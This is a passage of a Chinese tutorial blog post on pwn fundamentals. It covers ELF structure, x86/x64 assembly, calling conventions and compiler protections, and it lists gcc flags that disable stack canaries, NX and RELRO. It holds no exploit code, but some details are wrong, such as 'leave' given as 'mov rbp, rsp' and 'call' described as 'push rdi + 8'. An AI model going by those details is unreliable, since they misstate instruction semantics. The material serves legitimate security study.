<li><code>ET_EXEC</code>：可执行文件。ELF 类型为 <code>executable</code>，表明这个文件被标 记为可执行文件。这种类型的文件也称为程序，是一个进程开始执 行的入口。</li>
<li><code>ET_DYN</code>：共享目标文件。ELF 类型为 <code>dynamic</code>，意味着该文件被标记 为了一个动态的可链接的目标文件，也称为共享库。这类共享库会在 程序运行时被装载并链接到程序的进程镜像中。</li>
<li><code>ET_CORE</code>：核心文件。在程序崩溃或者进程传递了一个 <code>SIGSEGV</code> 信号（分段违规）时，会在核心文件中记录整个进程的镜像信息。可以使用 <code>GDB</code> 读取这类文件来辅助调试并查找程序崩溃的原因。</li>
</ul>
<p><strong>ELF头部</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ELF <span class="title">header</span> <span class="params">(Ehdr)</span></span></span><br><span class="line"><span class="function"><span class="meta">#<span class="keyword">define</span> EI_NIDENT 16</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span>&#123;    </span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> e_ident[EI_NIDENT];	<span class="comment">/* 幻数以及其他信息*/</span>   </span><br><span class="line">	<span class="type">uint16_t</span> e_type;					<span class="comment">/* 对象文件类型*/</span>   </span><br><span class="line">	<span class="type">uint16_t</span> e_machine;					<span class="comment">/* 架构*/</span>  </span><br><span class="line">	<span class="type">uint32_t</span> e_version;					<span class="comment">/* 对象文件版本*/</span>  </span><br><span class="line">    ElfN_Addr e_entry;					<span class="comment">/* 程序入口的虚拟地址*/</span>    </span><br><span class="line">	ElfN_Off e_phoff;					<span class="comment">/* 程序头表的偏移量（按字节计算）*/</span>  </span><br><span class="line">	ElfN_Off e_shoff;					<span class="comment">/* 节头表的偏移量（按字节计算）*/</span>  </span><br><span class="line">	<span class="type">uint32_t</span> e_flags;					<span class="comment">/* 保存与文件相关的、特定于处理器的标 志。标志名称采用EF_machine_flag的格式*/</span></span><br><span class="line">	<span class="type">uint16_t</span> e_ehsize;					<span class="comment">/* ELF头部的大小（按字节计算） */</span>  </span><br><span class="line">	<span class="type">uint16_t</span> e_phentsize;				<span class="comment">/* 程序头表的条目大小（按字节计算） */</span></span><br><span class="line">	<span class="type">uint16_t</span> e_phnum;					<span class="comment">/* 程序头表的条目数，可以为0 */</span>    </span><br><span class="line">	<span class="type">uint16_t</span> e_shentsize;				<span class="comment">/* 节头表的条目大小（按字节计算） */</span>    </span><br><span class="line">	<span class="type">uint16_t</span> e_shnum;					<span class="comment">/* 节头表的条目数，可以为0 */</span>    </span><br><span class="line">	<span class="type">uint16_t</span> e_shstrndx;<span class="comment">/* 节头表中与节名称字符串表相关的条目的 索引。如果文件没有节名称字符串表，此参数可以为SHN_UNDEF */</span> </span><br><span class="line">&#125; ElfN_Ehdr; </span><br></pre></td></tr></table></figure></div>

<p><strong>ELF程序头</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Program <span class="title">header</span> <span class="params">(Phdr)</span><span class="keyword">typedef</span> <span class="keyword">struct</span> </span>&#123;  </span><br><span class="line">	<span class="type">uint32_t</span> p_type;	<span class="comment">/*segment type*/</span>  </span><br><span class="line">	Elf32_Off p_offset;	<span class="comment">/*segment offset*/</span>   </span><br><span class="line">	Elf32_Addr p_vaddr;	<span class="comment">/*segment virtual addr*/</span>    </span><br><span class="line">	Elf32_Addr p_paddr;	<span class="comment">/*segment physical addr*/</span>   </span><br><span class="line">	<span class="type">uint32_t</span> p_filesz;	<span class="comment">/*size of segment in the file*/</span>    </span><br><span class="line">	<span class="type">uint32_t</span> p_memsz;	<span class="comment">/*size of segment in the memory*/</span>    </span><br><span class="line">	<span class="type">uint32_t</span> p_flags;	<span class="comment">/*segment flag : R|W|X*/</span>    </span><br><span class="line">	<span class="type">uint32_t</span> p_align;	<span class="comment">/*segment alignment in memory*/</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br><span class="line"><span class="comment">/*FOR 64Bit, p_flags is in total struct*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;	    </span><br><span class="line">	<span class="type">uint32_t</span> p_type;	    </span><br><span class="line">	<span class="type">uint32_t</span> p_flags;    </span><br><span class="line">	Elf64_Off p_offset;    </span><br><span class="line">	Elf64_Addr p_vaddr;    </span><br><span class="line">	Elf64_Addr p_paddr;    </span><br><span class="line">	<span class="type">uint64_t</span> p_filesz;    </span><br><span class="line">	<span class="type">uint64_t</span> p_memsz;    </span><br><span class="line">	<span class="type">uint64_t</span> p_align;</span><br><span class="line">&#125; Elf64_Phdr; </span><br></pre></td></tr></table></figure></div>

<p><strong>ELF节头</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Section <span class="title">header</span> <span class="params">(Shdr)</span>    </span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span>&#123;    </span><br><span class="line">	<span class="type">uint32_t</span> sh_name;	<span class="comment">// offset into shdr string table for shdr name	    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_type;	<span class="comment">// shdr type I.E SHT_PROGBITS    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_flags;	<span class="comment">// shdr flags I.E SHT_WRITE|SHT_ALLOC     </span></span><br><span class="line">	Elf32_Addr sh_addr;	<span class="comment">// address of where section begins    </span></span><br><span class="line">	Elf32_Off sh_offset;	<span class="comment">// offset of shdr from beginning of file    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_size;	<span class="comment">// size that section takes up on disk    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_link;	<span class="comment">// points to another section    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_info;	<span class="comment">// interpretation depends on section type    </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_addralign;	<span class="comment">// alignment for address of section     </span></span><br><span class="line">	<span class="type">uint32_t</span> sh_entsize;	<span class="comment">// size of each certain entries that may be in </span></span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;    </span><br><span class="line">	<span class="type">uint32_t</span> sh_name;	/ * <span class="function">Section <span class="title">name</span> <span class="params">(string tbl index)</span> */    </span></span><br><span class="line"><span class="function">	<span class="type">uint32_t</span> sh_type</span>;	/ * Section type */    </span><br><span class="line">	<span class="type">uint64_t</span> sh_flags;	/ * Section flags */    </span><br><span class="line">	Elf64_Addr sh_addr;	/ * Section <span class="keyword">virtual</span> addr at execution */    </span><br><span class="line">	Elf64_Off sh_offset;	/ * Section file offset */   </span><br><span class="line">	<span class="type">uint64_t</span> sh_size;	/ * Section size in bytes */    </span><br><span class="line">	<span class="type">uint32_t</span> sh_link;	/ * Link to another section */    </span><br><span class="line">	<span class="type">uint32_t</span> sh_info;	/ * Additional section information */   </span><br><span class="line">	<span class="type">uint64_t</span> sh_addralign;	/ * Section alignment */    </span><br><span class="line">	<span class="type">uint64_t</span> sh_entsize;	/ * Entry size <span class="keyword">if</span> section holds table */</span><br><span class="line">&#125; Elf64_Shdr; </span><br></pre></td></tr></table></figure></div>

<p><strong>ELF重要节</strong></p>
<ul>
<li><code>.init</code> 节和 <code>.fini</code> 节。</li>
<li><code>.text</code> 节。</li>
<li><code>.bss</code> 节, <code>.data</code> 节, <code>.rodata</code> 节。</li>
<li>延迟绑定 <code>.plt</code>, <code>.got</code>, <code>.got.plt</code>。</li>
<li><code>.rel.*</code>, <code>.rela.*</code> 节。</li>
<li><code>.dynamic</code> 节。</li>
<li><code>.init_array</code> 和 <code>.fini_array</code>。</li>
<li><code>.shstrtab</code>, <code>.symtab</code>, <code>.strtab</code>, <code>.dynsym</code>,  <code>.hash</code> 及 <code>.dynstr</code>节。</li>
<li><code>.ctors</code> 和 <code>.dtors</code> 节 。</li>
</ul>
<h3 id="符号和剥离的二进制文件"><a href="#符号和剥离的二进制文件" class="headerlink" title="符号和剥离的二进制文件"></a>符号和剥离的二进制文件</h3><p>高级源代码（如C代码）均以有意义的、人类可读的函数和变量命名为中心。编译程序时，编译器会翻译符号，这些符号会跟踪其名称，并记录哪些二进制代码和数据对应哪个符号。如函数符号提供符 号从高级函数名称到第一个地址和每个函数的大小的映射。链接器在组合对象文件时通常使用此信息，例如，使用此信息来解析模块之间的函数和变量引用，并且帮助调试。</p>
<p>可以使用命令查看二进制文件的符合信息。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">readelf --syms a.out</span><br></pre></td></tr></table></figure></div>

<p><code>GCC</code> 的默认行为是不自动剥离新编译 的二进制文件。如果你想知道带符号的二进制文件最终是如何被剥离 的，可以使用 <code>strip</code> 命令。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">strip --strip-all a.out</span><br></pre></td></tr></table></figure></div>

<h3 id="二进制文件的加载"><a href="#二进制文件的加载" class="headerlink" title="二进制文件的加载"></a>二进制文件的加载</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/image-20231109145853764.png"
                      alt="image-20231109145853764"
                ></p>
<ul>
<li>创建一个进程，包含虚拟地址空间。</li>
<li>将解释器映射到进程的虚拟内存中，它用于加载二进制文件并执行必要的重定位操作，一般名字为 <code>ld-linux.so</code>。解释器加载后内核将控制权交给解释器，解释器会在用户空间工作。</li>
<li>解释器解析并找出二进制文件使用的动态库，并将其映射到虚拟地址空间，然后在代码节执行所有必要的重定位。</li>
</ul>
<h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><p>二进制文件加载到进程中执行的时候动态链接器执行了最后的重定位。例如在编译时由于不知道加载地址，因此它会解析共享库中函数的引用。这里需要简单介绍一下，实际上在加载二进制文件的时候许多重定位一般都不会立即完成，而是延迟到对未解析位置进行首次引用之前，这就是延迟绑定。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/plt.got.png"
                      alt="plt.got"
                ></p>
<h2 id="推荐书籍"><a href="#推荐书籍" class="headerlink" title="推荐书籍"></a>推荐书籍</h2><p>《二进制分析实战》</p>
<p>《Linux二进制分析》</p>
<h1 id="汇编语言基础"><a href="#汇编语言基础" class="headerlink" title="汇编语言基础"></a>汇编语言基础</h1><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p><code>x32</code> 寄存器：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x32reg.jpg"
                      alt="x32reg"
                ></p>
<p><code>x64</code> 寄存器：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x64reg.png"
                      alt="x64reg"
                ></p>
<h2 id="常见汇编指令"><a href="#常见汇编指令" class="headerlink" title="常见汇编指令"></a>常见汇编指令</h2><p><strong>mov 操作数，源操作数</strong></p>
<p><code>mov</code> 指令将第二个操作数（可以是寄存器的内容、内存中的内容或值）复制到第一个操作数（寄存器或内存）。mov不能用于直接从内存复制到内存</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov &lt;reg&gt;,&lt;reg&gt;  	; mov rax, rbx</span><br><span class="line">mov &lt;reg&gt;,&lt;mem&gt;		; mov rax, [rbc] ; mov edx, [esi+4*ebx + 0x8]   </span><br><span class="line">mov &lt;mem&gt;,&lt;reg&gt;		; mov [rax], rbx</span><br><span class="line">mov &lt;reg&gt;,&lt;const&gt;	; mov rax, 0x8</span><br><span class="line">mov &lt;mem&gt;,&lt;const&gt;	; mov [rax], 0xff</span><br></pre></td></tr></table></figure></div>

<p><strong>push 操作数</strong></p>
<p><code>push</code> 指令将操作数压入内存的栈中，并且<code>rsp - 8 / esp - 4</code>。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">push &lt;reg&gt;			; push rax</span><br><span class="line">push &lt;mem&gt;			; push [rdx]</span><br><span class="line">push &lt;con&gt;			; push 0xff</span><br></pre></td></tr></table></figure></div>

<p><strong>pop 操作数</strong></p>
<p><code>pop</code> 指令与 <code>push</code> 指令相反，它执行的是出栈的工作，并且 <code>rsp + 8 / esp + 4</code>。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop &lt;reg&gt;			; pop rax</span><br><span class="line">pop &lt;mem&gt;			; pop [rdi]</span><br></pre></td></tr></table></figure></div>

<p><strong>lea 操作数，源操作数</strong></p>
<p><code>lea</code> 实际上是一个载入有效地址指令，将第二个操作数表示的地址载入到第一个操作数（寄存器）中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea &lt;reg&gt;,&lt;mem&gt;		; lea edi, [ebx+4*esi] </span><br></pre></td></tr></table></figure></div>

<p><strong>add 操作数，源操作数</strong></p>
<p><code>add</code> 指令将两个操作数相加，且将相加后的结果保存到第一个操作数中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">add &lt;reg&gt;,&lt;reg&gt;		;</span><br><span class="line">add &lt;reg&gt;,&lt;mem&gt;		;</span><br><span class="line">add &lt;mem&gt;,&lt;reg&gt;		;</span><br><span class="line">add &lt;reg&gt;,&lt;con&gt;		;</span><br><span class="line">add &lt;mem&gt;,&lt;con&gt;		;</span><br></pre></td></tr></table></figure></div>

<p><strong>sub 操作数，源操作数</strong></p>
<p><code>sub</code>指令指示第一个操作数减去第二个操作数，并将相减后的值保存在第一个操作数，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub &lt;reg&gt;,&lt;reg&gt;		;</span><br><span class="line">sub &lt;reg&gt;,&lt;mem&gt;		;</span><br><span class="line">sub &lt;mem&gt;,&lt;reg&gt;		;</span><br><span class="line">sub &lt;reg&gt;,&lt;con&gt;		;</span><br><span class="line">sub &lt;mem&gt;,&lt;con&gt;		;</span><br></pre></td></tr></table></figure></div>

<p><strong>inc 操作数 &amp;&amp; dec 操作数</strong></p>
<p><code>inc</code>，<code>dec</code> 分别表示将操作数自加1，自减1，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">inc &lt;reg&gt;			;</span><br><span class="line">inc &lt;mem&gt;			;</span><br><span class="line">dec &lt;reg&gt;			;</span><br><span class="line">dec &lt;mem&gt;			;</span><br></pre></td></tr></table></figure></div>

<p><strong>imul</strong></p>
<p>整数相乘指令，它有两种指令格式，一种为两个操作数，将两个操作数的值相乘，并将结果保存在第一个操作数中，第一个操作数必须为寄存器；第二种格式为三个操作数，其语义为：将第二个和第三个操作数相乘，并将结果保存在第一个操作数中，第一个操作数必须为寄存器。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">imul &lt;reg&gt;,&lt;reg&gt;		; imul rax, rbx ==&gt; rax = rax * rbx</span><br><span class="line">imul &lt;reg&gt;,&lt;mem&gt;		;</span><br><span class="line">imul &lt;reg&gt;,&lt;reg&gt;,&lt;con&gt;	; imul rax, rbx, 0x10 ==&gt; rax = rbx * 0x10</span><br><span class="line">imul &lt;reg&gt;,&lt;mem&gt;,&lt;con&gt;	;</span><br></pre></td></tr></table></figure></div>

<p><strong>and 操作数，源操作数, or 操作数，源操作数, xor 操作数，源操作数</strong></p>
<p>逻辑与、逻辑或、逻辑异或操作指令，用于操作数的位操作，操作结果放在第一个操作数中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">and &lt;reg&gt;,&lt;reg&gt;</span><br><span class="line">and &lt;reg&gt;,&lt;mem&gt;</span><br><span class="line">and &lt;mem&gt;,&lt;reg&gt;</span><br><span class="line">and &lt;reg&gt;,&lt;con&gt;</span><br><span class="line">and &lt;mem&gt;,&lt;con&gt;</span><br><span class="line"></span><br><span class="line">or &lt;reg&gt;,&lt;reg&gt;</span><br><span class="line">or &lt;reg&gt;,&lt;mem&gt;</span><br><span class="line">or &lt;mem&gt;,&lt;reg&gt;</span><br><span class="line">or &lt;reg&gt;,&lt;con&gt;</span><br><span class="line">or &lt;mem&gt;,&lt;con&gt;</span><br><span class="line"></span><br><span class="line">xor &lt;reg&gt;,&lt;reg&gt;</span><br><span class="line">xor &lt;reg&gt;,&lt;mem&gt;</span><br><span class="line">xor &lt;mem&gt;,&lt;reg&gt;</span><br><span class="line">xor &lt;reg&gt;,&lt;con&gt;</span><br><span class="line">xor &lt;mem&gt;,&lt;con&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>not</strong></p>
<p>位翻转指令，将操作数中的每一位翻转，即0-&gt;1, 1-&gt;0。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">not &lt;reg&gt;</span><br><span class="line">not &lt;mem&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>neg</strong></p>
<p>取负指令。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">neg &lt;reg&gt;</span><br><span class="line">neg &lt;mem&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>SHL、SHR、SAL、SAR: 移位指令</strong></p>
<p>算数移位考虑符号，逻辑移位不考虑。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;SHL(Shift Left):             ;逻辑左移</span><br><span class="line">;SHR(Shift Right):            ;逻辑右移</span><br><span class="line">;SAL(Shift Arithmetic Left):  ;算术左移</span><br><span class="line">;SAR(Shift Arithmetic Right): ;算术右移</span><br><span class="line"></span><br><span class="line">;其中的 SHL 和 SAL 相同, 但 SHR 和 SAR 不同.</span><br><span class="line"></span><br><span class="line">;SHL, SAL: 每位左移, 低位补 0,  高位进 CF</span><br><span class="line">;SHR     : 每位右移, 低位进 CF, 高位补 0</span><br><span class="line">;SAR     : 每位右移, 低位进 CF, 高位不变</span><br><span class="line">;它们的结果影响 OF、SF、ZF、PF、CF</span><br><span class="line">;它们的指令格式相同:</span><br><span class="line">SHL/SHR/SAL/SAR &lt;reg&gt;, &lt;con8&gt;</span><br><span class="line">SHL/SHR/SAL/SAR &lt;mem&gt;, &lt;con8&gt;</span><br><span class="line">SHL/SHR/SAL/SAR &lt;reg&gt;, CL</span><br><span class="line">SHL/SHR/SAL/SAR &lt;mem&gt;, CL</span><br></pre></td></tr></table></figure></div>

<p><strong>ROL、ROR、RCL、RCR: 循环移位指令</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;ROL(Rotate Left):                循环左移</span><br><span class="line">;ROR(Rotate Right):               循环右移</span><br><span class="line">;RCL(Rotate through Carry Left):  带进位循环左移</span><br><span class="line">;RCR(Rotate through Carry Right): 带进位循环右移</span><br><span class="line"></span><br><span class="line">;ROL: 循环左移, 高位到低位并送 CF</span><br><span class="line">;ROR: 循环右移, 低位到高位并送 CF</span><br><span class="line">;RCL: 循环左移, 进位值(原CF)到低位, 高位进 CF</span><br><span class="line">;RCR: 循环右移, 进位值(原CF)到高位, 低位进 CF</span><br><span class="line"></span><br><span class="line">;它们的结果影响 OF、CF</span><br><span class="line">;它们的指令格式相同:</span><br><span class="line">ROL/ROR/RCL/RCR &lt;reg&gt;, &lt;con8&gt;</span><br><span class="line">ROL/ROR/RCL/RCR &lt;mem&gt;, &lt;con8&gt;</span><br><span class="line">ROL/ROR/RCL/RCR &lt;reg&gt;, CL</span><br><span class="line">ROL/ROR/RCL/RCR &lt;mem&gt;, CL</span><br></pre></td></tr></table></figure></div>

<p><strong>jmp 操作数</strong></p>
<p>控制转移到<code>label</code>所指示的地址。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jump label</span><br></pre></td></tr></table></figure></div>

<p><strong>leave</strong></p>
<p><code>leave</code> 指令等同于两条指令 <code>mov rbp, rsp; pop rbp</code></p>
<p><strong>ret</strong></p>
<p><code>ret</code> 指令等同于 <code>pop rip</code>。</p>
<p><strong>call 操作数</strong></p>
<p><code>call</code> 操作数 <code>call</code> 指令首先将当前执行指令地址入栈，然后无条件转移到由标签指示的指令。与其它简单的跳转指令不同，<code>call</code> 指令保存调用之前的地址信息（当 <code>call</code> 指令结束后，返回到调用之前的地址）。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">call label		; call label ==&gt; push rdi + 8; jump label; ... ; ret;</span><br></pre></td></tr></table></figure></div>

<h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><h3 id="状态标志"><a href="#状态标志" class="headerlink" title="状态标志"></a>状态标志</h3><p>状态标志用于指示算术运算（例如使用<code>ADD</code>、<code>SUB</code>、<code>MUL</code>、<code>DIV</code>等指令）后的结果，它们包括包括有以下几个标志：</p>
<ul>
<li><code>CF</code>：进位标志（Carry flag）是标志寄存器的第0位，又被称之为<code>CY</code>，当其被设置时表示运算结果的最高有效位发生进位或借位的情况，并在无符号整数的运算中表示运算的溢出状态。</li>
<li><code>PF</code>：奇偶校验标志（Parity flag）是标志寄存器的第2位，当其被设置表示结果中包含偶数个值为1的位，否则表示结果中包含奇数个值为1的位。</li>
<li><code>AF</code>：辅助进位标志（Auxiliary carry flag）是标志寄存器的第4位，当其被设置表示在算术运算中低三位发生进位或借位（例如<code>AL</code>向<code>AH</code>进位或借位）或BCD码算术运算中发生进位或借位的情况。</li>
<li><code>ZF</code>：零标志（Zero flag）是标志寄存器的第6位，当其被设置时运算的结果是否等于0，否则不等于0。</li>
<li><code>SF</code>：符号标志（Sign flag）是标志寄存器的第7位，当其被设置时表示结果为负数，否则为正数。</li>
<li><code>OF</code>：溢出标志（Overflow flag）是标志寄存器的第11位，当其被设置时代表运算结果溢出，即结果超出了能表达的最大范围。</li>
</ul>
<p>状态标志中，只有<code>CF</code>标志能被直接通过<code>STC</code>、<code>CLC</code>以及<code>CMC</code>指令修改。</p>
<h3 id="控制标志"><a href="#控制标志" class="headerlink" title="控制标志"></a>控制标志</h3><ul>
<li><code>DF</code>：方向标志（Direction flag）是标志寄存器的第10位，用于指示串操作指令地址的变化方向。当其被设置时，存储器由自高向低方向变化，否则相反。<code>STD</code>与<code>CLD</code>指令分别用于设置、清除<code>DF</code>标志的值。</li>
</ul>
<h3 id="系统标志"><a href="#系统标志" class="headerlink" title="系统标志"></a>系统标志</h3><ul>
<li><code>TF</code>：陷阱标志（Trap flag）是标志寄存器的第8位，当其被设置时将开启单步调试模式。在其被设置的情况下，每个指令被执行后都将产生一个调试异常，以便于观察指令执行后的情况。</li>
<li><code>IF</code>：中断标志（Interrupt flag）是标志寄存器的第9位，当其被设置时表示CPU可响应可屏蔽中断（maskable interrupt）。</li>
<li><code>IOPL</code>：I&#x2F;O特权级别标志（I&#x2F;O privilege level  flag）是标志寄存器的第12位以及第13位，表示当其程序或任务的I&#x2F;O权限级别。I&#x2F;O权限级别为0～3范围之间的值，通常一般用户程序I&#x2F;O特权级别为0。当前运行程序的CPL（current privilege level）必须小于等于IOPL，否则将发生异常。</li>
<li><code>NT</code>：嵌套任务（Nested task flag）是标志寄存器的第14位，用于控制中断返回指令<code>IRET</code>的执行方式。若被设置则将通过中断的方式执行返回，否则通过常规的堆栈的方式执行。在执行<code>CALL</code>指令、中断或异常处理时，处理器将会设置该标志。</li>
<li><code>RF</code>：恢复标志（Resume flag）是标志寄存器的第16位，用于控制处理器对调试异常的响应。若其被设置则会暂时禁止断点指令产生的调试异常，其复位后断点指令将会产生异常。</li>
<li><code>VM</code>：虚拟8086模式标志（Virtual 8086 mode flag）是标志寄存器的第17位，当其被设置表示启用虚拟8086模式（在保护模式下模拟实模式），否则退回到保护模式工作。</li>
<li><code>AC</code>：对齐检查标志（Alignment check (or access control) flag）是标志寄存器的第18位。当该标志位被设置且<code>CR0</code>寄存器中的<code>AM</code>位被设置时，将对用户态下对内存引用进行对齐检查，在存在未对齐的操作数时产生异常。</li>
<li><code>VIF</code>：虚拟中断标志（Virtual interrupt flag）是标志寄存器的第19位，为<code>IF</code>标志的虚拟映象。该标志与<code>VIP</code>标志一起，且在<code>CR4</code>寄存器中<code>VME</code>或<code>PVI</code>位被设置且<code>IOPL</code>小于3时，处理器才将识别该标志。</li>
<li><code>VIP</code>：虚拟中断挂起标志（Virtual interrupt pending flag）是标志寄存器的第20位，其被设置表示有一个中断被挂起（等待处理），否则表示没有等待处理的中断。该标志通常与<code>VIF</code>标志搭配一起使用。</li>
<li><code>ID</code>：ID标志（Identification flag）是标志寄存器的第21位，通过修改该位的值可以测试是否支持<code>CPUID</code>指令。</li>
</ul>
<h1 id="函数调用栈及ELF相关安全机制"><a href="#函数调用栈及ELF相关安全机制" class="headerlink" title="函数调用栈及ELF相关安全机制"></a>函数调用栈及ELF相关安全机制</h1><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p><strong>x32 函数调用栈：</strong></p>
<p>函数通过栈传参，参数从右到左依次入栈。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x32stack.png"
                      alt="x32stack"
                ></p>
<p><strong>x64 函数调用栈：</strong></p>
<p>参数前六个参数从左到右分别为<code>rdi, rsi, rdx, rcx, r8, r9</code>。超过六个参数，多余参数通过栈传参。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x64stack.png"
                      alt="x64stack"
                ></p>
<h2 id="ELF相关安全机制"><a href="#ELF相关安全机制" class="headerlink" title="ELF相关安全机制"></a>ELF相关安全机制</h2><p><strong>RELRO</strong></p>
<ul>
<li>简介</li>
</ul>
<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 <code>GOT（Global Offset Table）</code>攻击。<code>RELRO</code> 为”<code>Partial RELRO</code>，说明我们对 <code>GOT</code> 表具有写权限。</p>
<ul>
<li>开启方式：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c						// 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o test test.c			// 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o test test.c				// 部分开启，即Partial RELRO 重定位表格只读，重定位项可读写</span><br><span class="line">gcc -z now -o test test.c				// 全部开启，重定位表格和重定位项均为只读</span><br></pre></td></tr></table></figure></div>

<p><strong>Canary</strong></p>
<ul>
<li>简介</li>
</ul>
<p>函数开始执行的时候会先往栈里插入<code>cookie</code>信息，当函数真正返回的时候会验证 <code>cookie</code> 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 <code>cookie</code> 信息给覆盖掉，导致栈保护检查失败而阻止 <code>shellcode</code> 的执行。在 <code>Linux</code> 中我们将<code>cookie</code> 信息称为 <code>canary</code>。</p>
<ul>
<li>开启方式：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c						// 默认情况下，不开启Canary保护</span><br><span class="line">gcc -fno-stack-protector -o test test.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure></div>

<p><strong>NX</strong></p>
<ul>
<li>简介</li>
</ul>
<p><code>NX</code> 即 <code>No-eXecute</code>（不可执行）的意思，<code>NX（DEP）</code>的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 <code>shellcode</code>时，程序会尝试在数据页面上执行指令，此时 <code>CPU</code> 就会抛出异常，而不是去执行恶意指令。</p>
<ul>
<li>开启方式</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c					// 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c		// 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o test test.c	// 开启NX保护</span><br></pre></td></tr></table></figure></div>

<p><strong>PIE &amp; ASLR</strong></p>
<ul>
<li>简介</li>
</ul>
<p><code>ASLR</code>保护分为三个层级:</p>
<div class="highlight-container" data-rel="Tex"><figure class="iseeu highlight tex"><table><tr><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈和堆的随机化。</span><br></pre></td></tr></table></figure></div>

